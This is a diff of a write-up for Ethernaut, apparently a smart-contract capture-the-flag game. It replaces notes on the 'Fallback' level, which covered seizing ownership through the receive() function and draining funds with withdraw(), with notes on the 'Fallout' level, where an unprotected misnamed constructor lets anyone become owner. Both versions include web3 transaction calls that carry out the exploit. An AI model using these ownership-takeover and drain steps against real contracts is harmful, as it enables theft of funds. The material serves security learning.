@@ -1,25 +1,15 @@
-# Level 2: Fallback
+# Level 2: [Fallout](https://ethernaut.openzeppelin.com/level/0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7)
 
 ## Level objectives:
 1. Claim ownership of contract.
-2. Drain contract.
 
 ## Steps:
-- To claim ownership, I can either send eth to the `contribute()` function until I surpass 1000 * 1 Ether, or send eth to the contract's fallback function, triggering the faulty `receive()` function that sets `owner = msg.sender`.
-- To send eth to the fallback function, `contribution[msg.sender] > 0`.
-- So I first send minimal eth to the `contribute()` function, to get my name in the hat.
+- The contract defines a function `Fal1out()` that is indicated to be a contstructor function in the comments.
+- It sets `owner = msg.sender;`
+- Since it has is missing the constructor declaration, this function can be called by anyone.
+- We abuse this by:
 ```sol
-contract.contribute.sendTransaction({   
-  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
-  value: web3.utils.toWei('0.0000001', 'ether')
+contract.Fal1out.sendTransaction({
+  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4"
 });
 ```
-- Then send eth to the fallback function to claim ownership.
-```sol
-contract.sendTransaction({   
-  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
-  value: web3.utils.toWei('0.0000001', 'ether')
-});
-```
-- Verified by calling `contract.owner()`.
-- Now  I call the `withdraw()` function to take all the eth in the contract.
